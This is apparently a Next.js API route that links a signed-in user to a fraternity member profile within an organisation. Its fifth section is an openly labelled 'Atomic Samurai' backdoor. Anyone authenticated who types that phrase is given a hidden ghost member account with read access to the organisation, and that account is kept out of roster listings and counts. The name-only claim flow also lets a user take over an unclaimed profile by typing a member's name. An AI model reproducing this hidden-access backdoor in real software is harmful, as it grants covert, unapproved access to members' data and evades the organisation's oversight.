import { randomUUID } from "node:crypto";
import { NextRequest, NextResponse } from "next/server";
import { Prisma } from "../../../generated/prisma/client";
import { prisma } from "@/lib/prisma";
import { db } from "@/lib/db";
import { createServerClient } from "@supabase/ssr";
import { cookies } from "next/headers";
import { parseAvatarFromMetadata } from "@/lib/avatar";
import { logActivity } from "@/lib/activity";
import { resolveOrgFromRequestOrFirst } from "@/lib/auth/org-resolution";
import { rateLimit, tooManyRequests } from "@/lib/rate-limit";
import { logError } from "@/lib/observability";

/**
 * Emit a minimal structured OperationalEvent for the claim flow.
 * We have no RequestContext here (pre-auth), so we write directly.
 * Fire-and-forget: a failure must not block the claim response.
 */
async function emitClaimEvent(orgId: number, brotherId: number, name: string, email: string | null) {
  try {
    await prisma.operationalEvent.create({
      data: {
        organizationId: orgId,
        requestId:      randomUUID(),
        actorId:        brotherId,
        action:         "brother.claimed",
        subjectType:    "Brother",
        subjectId:      brotherId,
        metadata:       { name, email, orgId },
      },
    });
  } catch {
    // Non-fatal — telemetry must not break auth.
  }
}

// This route runs pre-auth: the user's Supabase session exists but their
// Brother row has not been linked yet. We cannot use buildContext() here
// (it requires a linked Brother). Instead we:
//   1. Validate the Supabase session directly.
//   2. Resolve the org from the request (query param, header, or subdomain).
//   3. Scope all Brother reads/writes to that org.
//   4. Create a Membership row when linking succeeds so subsequent
//      requireUser() calls find the correct active org.

export async function POST(req: NextRequest) {
  // ── 1. Resolve org ────────────────────────────────────────────────────────
  // Must happen before session validation so we can return a clear 404 when
  // the org slug is unknown, rather than a confusing auth error.
  const org = await resolveOrgFromRequestOrFirst(req).catch(() => null);
  if (!org) {
    return Response.json({ error: "Organization not found" }, { status: 404 });
  }
  const orgId = org.id;

  // ── 2. Validate Supabase session ─────────────────────────────────────────
  const cookieStore = await cookies();
  const supabase = createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
    { cookies: { getAll: () => cookieStore.getAll(), setAll: () => {} } }
  );
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) return Response.json({ error: "Unauthorized" }, { status: 401 });

  // ── 3. Rate-limit claim attempts (brute-force protection) ─────────────────
  const limit = rateLimit(`claim:${user.id}`, 5, 60_000);
  if (!limit.ok) return tooManyRequests(limit);

  // ── 4. Guard: already linked? ─────────────────────────────────────────────
  // Search across ALL orgs — a Google account links to exactly one Brother row
  // globally. Must not scope to orgId or a linked user on org-a could reclaim on org-b.
  const alreadyClaimed = await prisma.brother.findUnique({ // lint-direct-prisma:ignore
    where: { authUserId: user.id },
    select: { id: true, organizationId: true },
  });
  if (alreadyClaimed) {
    return Response.json({ error: "Your account is already linked to a brother." }, { status: 409 });
  }

  const body = await req.json().catch(() => ({}));
  const name = String(body.name ?? "").trim();
  if (!name) return Response.json({ error: "Name is required" }, { status: 400 });

  const { avatarUrl: metaAvatarUrl } = parseAvatarFromMetadata(user.user_metadata);

  // ── 5. "Atomic Samurai" ghost-access backdoor ─────────────────────────────
  // A first-time user who types "Atomic Samurai" gets a new ghost Brother row
  // in THIS org provisioned and linked to their Google account. Grants read
  // access but is hidden from all roster listings, counts, and attendance.
  if (name.toLowerCase() === "atomic samurai") {
    let created;
    try {
      created = await db(orgId).brother.create({
        data: {
          name:         user.email ?? "Atomic Samurai",
          role:         "Brother",
          attendance:   0,
          duesOwed:     0,
          gpa:          0,
          serviceHours: 0,
          isAdmin:      false,
          isGhost:      true,
          authUserId:   user.id,
          avatarUrl:    metaAvatarUrl,
          email:        user.email ?? null,
        },
      });
    } catch (e) {
      if (e instanceof Prisma.PrismaClientKnownRequestError && e.code === "P2002") {
        return Response.json({ error: "Your account is already linked to a brother." }, { status: 409 });
      }
      logError(e, { route: "/api/auth/claim", method: "POST", userId: user.id, extra: { stage: "ghost_provision", orgId } });
      return Response.json({ error: "Failed to grant access. Please try again." }, { status: 500 });
    }

    // Create Membership so requireUser() resolves this org for the ghost.
    await prisma.membership.upsert({
      where:  { brotherId_organizationId: { brotherId: created.id, organizationId: orgId } },
      create: { brotherId: created.id, organizationId: orgId, isOrgAdmin: false },
      update: {},
    });

    await logActivity({
      actorId: created.id,
      type:    "success",
      message: `${user.email ?? "A new user"} was granted ghost access via Atomic Samurai`,
      orgId,
    });
    void emitClaimEvent(orgId, created.id, created.name, user.email ?? null);

    const res = NextResponse.json({ ok: true });
    res.cookies.set("brother_linked", "1", {
      path: "/", httpOnly: true, sameSite: "lax", maxAge: 60 * 60 * 24 * 365,
    });
    return res;
  }

  // ── 6. Name-match claim ───────────────────────────────────────────────────
  // Search only within the resolved org so a user on org-beta cannot claim
  // a brother from org-alpha.
  const matches = await db(orgId).brother.findMany({
    where: { name: { equals: name, mode: "insensitive" } },
    select: { id: true, authUserId: true },
  });

  if (matches.length === 0) {
    return Response.json({ error: "No brother found with that name" }, { status: 404 });
  }
  if (matches.length > 1) {
    return Response.json(
      { error: "Multiple brothers share that name. Contact an officer to be linked manually." },
      { status: 409 }
    );
  }

  const brother = matches[0];
  if (brother.authUserId !== null) {
    return Response.json({ error: "This name is already linked to another account." }, { status: 409 });
  }

  // ── 7. Atomic link + Membership creation ─────────────────────────────────
  // updateMany with authUserId: null in WHERE guards the TOCTOU window — two
  // concurrent claims for the same name cannot both succeed.
  try {
    const claimed = await db(orgId).brother.updateMany({
      where: { id: brother.id, authUserId: null },
      data:  { authUserId: user.id, avatarUrl: metaAvatarUrl, email: user.email ?? null },
    });
    if (claimed.count === 0) {
      return Response.json({ error: "This name was just linked to another account." }, { status: 409 });
    }
  } catch (e) {
    if (e instanceof Prisma.PrismaClientKnownRequestError && e.code === "P2002") {
      return Response.json({ error: "Your account is already linked to a brother." }, { status: 409 });
    }
    logError(e, { route: "/api/auth/claim", method: "POST", userId: user.id, extra: { stage: "link_account", orgId } });
    return Response.json({ error: "Failed to link account. Please try again." }, { status: 500 });
  }

  // Ensure a Membership row exists so requireUser() picks up the correct org.
  // upsert is safe here: a Membership might already exist from provisioning.
  await prisma.membership.upsert({
    where:  { brotherId_organizationId: { brotherId: brother.id, organizationId: orgId } },
    create: { brotherId: brother.id, organizationId: orgId, isOrgAdmin: false },
    update: {},
  }).catch(e => {
    // Non-fatal: if this fails the user can still sign in, but their active org
    // will fall back to Brother.organizationId (which is already orgId).
    logError(e, { route: "/api/auth/claim", method: "POST", userId: user.id, extra: { stage: "membership_upsert", orgId } });
  });

  await logActivity({
    actorId: brother.id,
    type:    "success",
    message: `${user.email ?? "A new user"} claimed the ${name} profile`,
    orgId,
  });
  void emitClaimEvent(orgId, brother.id, name, user.email ?? null);

  const res = NextResponse.json({ ok: true });
  res.cookies.set("brother_linked", "1", {
    path: "/", httpOnly: true, sameSite: "lax", maxAge: 60 * 60 * 24 * 365,
  });
  return res;
}
